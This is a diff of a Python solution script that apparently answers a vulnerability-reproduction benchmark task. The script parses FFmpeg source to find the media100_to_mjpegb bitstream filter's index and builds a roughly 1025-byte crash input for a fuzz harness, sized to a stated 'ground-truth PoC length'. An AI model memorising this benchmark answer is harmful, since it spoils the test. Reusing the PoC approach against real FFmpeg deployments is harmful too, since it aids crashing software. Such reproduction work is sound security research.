@@ -1,189 +1,171 @@
 import os
-import tarfile
 import re
+import tarfile
+from typing import Optional, Tuple
 
 
 class Solution:
-    def solve(self, src_path: str) -> bytes:
-        index = 0
-        magic = b"MJPB"
-        min_payload_size = 1024
-
-        bsf_list_text = None
-        filter_text = None
-        config_text = None
-
+    def _find_in_tar(self, src_path: str, pattern: str) -> Optional[Tuple[str, str]]:
+        """
+        Search in a tarball for a C/C++/header file whose content matches the regex `pattern`.
+        Returns a tuple (member_name, content) for the first match, or None if not found.
+        """
         try:
             with tarfile.open(src_path, "r:*") as tar:
-                # Find relevant files in the tarball
                 for member in tar.getmembers():
                     if not member.isfile():
                         continue
-                    base = os.path.basename(member.name)
-                    if base == "bsf_list.c" and bsf_list_text is None:
-                        f = tar.extractfile(member)
-                        if f is not None:
-                            bsf_list_text = f.read().decode("utf-8", errors="ignore")
-                    if "media100_to_mjpegb" in base and base.endswith(
-                        (".c", ".cc", ".cpp", ".cxx")
-                    ):
-                        if filter_text is None:
-                            f = tar.extractfile(member)
-                            if f is not None:
-                                filter_text = f.read().decode("utf-8", errors="ignore")
-                    if base in ("config_components.h", "config.h", "config.mak") and config_text is None:
-                        f = tar.extractfile(member)
-                        if f is not None:
-                            config_text = f.read().decode("utf-8", errors="ignore")
-        except Exception:
-            # If anything goes wrong while reading the tarball, fall back to defaults
+                    name_lower = member.name.lower()
+                    if not (name_lower.endswith(".c") or name_lower.endswith(".cc") or
+                            name_lower.endswith(".cpp") or name_lower.endswith(".h")):
+                        continue
+                    f = tar.extractfile(member)
+                    if f is None:
+                        continue
+                    try:
+                        data = f.read().decode("utf-8", errors="ignore")
+                    except Exception:
+                        continue
+                    if re.search(pattern, data):
+                        return member.name, data
+        except tarfile.ReadError:
             pass
+        return None
 
-        enabled_macros = None
-        if config_text is not None:
-            enabled_macros = self._parse_enabled_bsf_macros(config_text)
-
-        if bsf_list_text is not None:
-            idx = self._get_bsf_index_from_list(bsf_list_text, enabled_macros)
-            if idx is not None:
-                index = idx
-
-        if filter_text is not None:
-            inferred_magic = self._infer_magic_bytes(filter_text)
-            if inferred_magic:
-                magic = inferred_magic
-            inferred_min_size = self._infer_min_size(filter_text)
-            if inferred_min_size is not None:
-                # Add some slack above the strict minimum
-                min_payload_size = max(min_payload_size, inferred_min_size + 16)
-
-        # Target total size close to ground-truth PoC length
-        target_total_size = 1025
-        payload_size = max(min_payload_size, target_total_size - 1)
-
-        # Keep size within a reasonable upper bound to avoid huge allocations
-        if payload_size < 16:
-            payload_size = 16
-        if payload_size > 4095:
-            payload_size = 4095
-
-        payload = bytearray(payload_size)
-
-        # Fill the first 64 bytes (or less) with repeated magic pattern
-        if not magic:
-            magic = b"MJPB"
-        pat_len = max(1, len(magic))
-        header_region = min(len(payload), 64)
-        for i in range(0, header_region, pat_len):
-            end = min(i + pat_len, header_region)
-            payload[i:end] = magic[: end - i]
-
-        # Fill the rest with deterministic pseudo-random data
-        for i in range(len(payload)):
-            if payload[i] == 0:
-                payload[i] = (i * 137 + 31) & 0xFF
-
-        poc = bytes([(index & 0xFF)]) + bytes(payload)
-        return poc
-
-    def _parse_enabled_bsf_macros(self, config_text: str):
-        enabled = set()
-        # Header-style: #define CONFIG_FOO_BSF 1
-        header_pattern = re.compile(r"#define\s+(CONFIG_[A-Z0-9_]+_BSF)\s+1")
-        for m in header_pattern.finditer(config_text):
-            enabled.add(m.group(1))
-
-        # Make-style: CONFIG_FOO_BSF=yes
-        mak_pattern = re.compile(r"(CONFIG_[A-Z0-9_]+_BSF)\s*=\s*yes")
-        for m in mak_pattern.finditer(config_text):
-            enabled.add(m.group(1))
-
-        if not enabled:
+    def _find_in_dir(self, src_path: str, pattern: str) -> Optional[Tuple[str, str]]:
+        """
+        Fallback if src_path is a directory rather than a tarball.
+        """
+        if not os.path.isdir(src_path):
             return None
-        return enabled
+        prog = re.compile(pattern)
+        for root, _, files in os.walk(src_path):
+            for fn in files:
+                fn_low = fn.lower()
+                if not (fn_low.endswith(".c") or fn_low.endswith(".cc") or
+                        fn_low.endswith(".cpp") or fn_low.endswith(".h")):
+                    continue
+                full = os.path.join(root, fn)
+                try:
+                    with open(full, "r", encoding="utf-8", errors="ignore") as fh:
+                        data = fh.read()
+                except Exception:
+                    continue
+                if prog.search(data):
+                    rel = os.path.relpath(full, src_path)
+                    return rel, data
+        return None
 
-    def _get_bsf_index_from_list(self, text: str, enabled_macros):
-        pattern_register = re.compile(
-            r"REGISTER_BSF\s*\(\s*([A-Z0-9_]+)\s*,\s*([A-Za-z0-9_]+)\s*,"
-        )
+    def _locate_bsf_array_source(self, src_path: str) -> Optional[str]:
+        """
+        Locate the source text that contains the BSF descriptor array entry for media100_to_mjpegb.
+        We search for a struct-style initializer: { "media100_to_mjpegb", ... }.
+        """
+        pattern = r'\{\s*"media100_to_mjpegb"\s*,'
+        found = self._find_in_tar(src_path, pattern)
+        if not found:
+            found = self._find_in_dir(src_path, pattern)
+        if not found:
+            return None
+        _, data = found
+        return data
 
-        current_enabled = True
-        assume_all_enabled = enabled_macros is None
-        idx = 0
-        target_idx = None
+    def _extract_filter_index_and_sel_offset(self, source: str) -> Tuple[Optional[int], int]:
+        """
+        From the source code containing `{ "media100_to_mjpegb", ... }` parse:
+        - filter_index: index of this entry within its array
+        - sel_offset: byte offset in fuzz input used to select the array index (if detectable)
+        """
+        # Locate the struct entry `{ "media100_to_mjpegb", ... }`
+        m_entry = re.search(r'\{\s*"media100_to_mjpegb"\s*,', source)
+        if not m_entry:
+            return None, 0
+        entry_pos = m_entry.start()
 
-        lines = text.splitlines()
-        for line in lines:
-            stripped = line.strip()
-            if stripped.startswith("#if"):
-                m = re.search(r"(CONFIG_[A-Z0-9_]+_BSF)", stripped)
-                if m:
-                    macro = m.group(1)
-                    if assume_all_enabled:
-                        current_enabled = True
-                    else:
-                        current_enabled = macro in enabled_macros
-                continue
-            if stripped.startswith("#else"):
-                if not assume_all_enabled:
-                    current_enabled = not current_enabled
-                continue
-            if stripped.startswith("#endif"):
-                current_enabled = True
-                continue
+        # Heuristically find the start of the array initializer: look for the '=' before entry
+        eq_pos = source.rfind("=", 0, entry_pos)
+        if eq_pos == -1:
+            return None, 0
 
-            m = pattern_register.search(stripped)
-            if not m:
-                continue
+        # Find the opening brace '{' of the array initializer after '='
+        brace_pos = source.find("{", eq_pos)
+        if brace_pos == -1 or brace_pos > entry_pos:
+            return None, 0
 
-            if not assume_all_enabled and not current_enabled:
-                continue
+        # Find the end of the initializer '};' after the entry
+        end_pos = source.find("};", entry_pos)
+        if end_pos == -1:
+            return None, 0
 
-            name = m.group(2)
-            if name == "media100_to_mjpegb":
-                target_idx = idx
-                break
-            idx += 1
+        arr_text = source[brace_pos:end_pos]
 
-        return target_idx
+        # Extract BSF names from struct entries of the form { "name", ... }
+        names = re.findall(r'\{\s*"([^"]+)"\s*,', arr_text)
+        if not names:
+            return None, 0
 
-    def _infer_magic_bytes(self, text: str) -> bytes:
-        # Prefer patterns like 'm','j','p','b' etc.
-        char_pattern = re.compile(
-            r"'(.)'\s*,\s*'(.)'\s*,\s*'(.)'\s*,\s*'(.)'"
-        )
-        best = None
-        for m in char_pattern.finditer(text):
-            token = "".join(m.groups())
-            if all(32 <= ord(c) < 127 for c in token):
-                lowered = token.lower()
-                if any(x in lowered for x in ("mjpb", "mjpg", "jpeg", "jpg ", "m100")):
-                    best = token.encode("ascii", errors="ignore")
-                    break
+        try:
+            filter_index = names.index("media100_to_mjpegb")
+        except ValueError:
+            return None, 0
 
-        if best:
-            return best
+        # Try to infer the array variable name to locate selection offset (optional)
+        array_name = None
+        pre_eq = source[:eq_pos]
+        bracket_pos = pre_eq.rfind("[")
+        if bracket_pos != -1:
+            j = bracket_pos - 1
+            while j >= 0 and pre_eq[j].isspace():
+                j -= 1
+            end = j + 1
+            while j >= 0 and (pre_eq[j].isalnum() or pre_eq[j] == "_"):
+                j -= 1
+            start = j + 1
+            candidate = pre_eq[start:end].strip()
+            if candidate:
+                array_name = candidate
 
-        # Fallback: look for 4-char string literals containing mjp*/jpeg
-        str_pattern = re.compile(r'"([^"\n]{4})"')
-        for m in str_pattern.finditer(text):
-            token = m.group(1)
-            lowered = token.lower()
-            if any(x in lowered for x in ("mjpb", "mjpg", "jpeg")):
-                return token.encode("ascii", errors="ignore")
+        sel_offset = 0
+        if array_name:
+            # Typical pattern: data[0] % FF_ARRAY_ELEMS(array_name)
+            pattern_sel = r'data\s*\[(\d+)\]\s*%\s*FF_ARRAY_ELEMS\s*\(\s*' + re.escape(array_name) + r'\s*\)'
+            m_sel = re.search(pattern_sel, source)
+            if m_sel:
+                try:
+                    sel_offset = int(m_sel.group(1))
+                except ValueError:
+                    sel_offset = 0
 
-        # Ultimate fallback
-        return b"MJPB"
+        return filter_index, sel_offset
 
-    def _infer_min_size(self, text: str):
-        # Look for simple comparisons: something->size < N or <= N
-        size_pattern = re.compile(r"->size\s*<\s*=?\s*(\d+)")
-        max_size = None
-        for m in size_pattern.finditer(text):
-            try:
-                val = int(m.group(1))
-            except ValueError:
-                continue
-            if max_size is None or val > max_size:
-                max_size = val
-        return max_size
+    def solve(self, src_path: str) -> bytes:
+        # Attempt to locate the BSF descriptor array that contains media100_to_mjpegb
+        source = self._locate_bsf_array_source(src_path)
+        filter_index: Optional[int] = None
+        sel_offset: int = 0
+
+        if source is not None:
+            filter_index, sel_offset = self._extract_filter_index_and_sel_offset(source)
+
+        # Fallback selection offset sanity
+        if sel_offset < 0 or sel_offset > 4096:
+            sel_offset = 0
+
+        # Choose PoC length. Use ground-truth length as a good default.
+        length = 1025
+
+        # Build a non-trivial pattern to maximize chance of driving code paths.
+        poc = bytearray(length)
+        for i in range(length):
+            poc[i] = (i * 17 + 31) & 0xFF
+
+        # If we discovered the filter index, place it at the inferred selection offset.
+        if filter_index is not None:
+            if sel_offset >= length:
+                # Ensure buffer large enough; grow conservatively if needed
+                extra = sel_offset + 1 - length
+                poc.extend(b"\x00" * extra)
+                length = len(poc)
+            poc[sel_offset] = filter_index & 0xFF
+
+        return bytes(poc)
